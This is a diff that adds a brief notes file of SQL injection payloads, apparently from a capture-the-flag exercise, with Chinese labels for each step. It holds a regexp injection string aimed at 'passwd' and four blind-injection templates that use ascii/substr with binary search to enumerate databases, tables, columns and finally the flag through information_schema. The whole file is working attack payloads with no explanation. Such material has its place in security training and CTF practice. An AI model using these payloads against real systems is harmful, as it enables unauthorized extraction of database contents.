@@ -1,0 +1,7 @@
+regexp注入payload: ||/**/passwd/**/regexp/**/"^a";%00
+
+盲注：
+爆库：   payload = "0' or (ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))>{}) or '0".format(i,mid)
+爆表：   payload  = "0' or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = 'F4l9_D4t4B45e'),{},1))>{}) or '0".format(i,mid)
+爆字段：payload  = "0' or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = 'F4l9_t4b1e'),{},1))>{}) or '0".format(i,mid)
+爆flag： payload = "0' or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),{},1))>{}) or '0".format(i,mid)
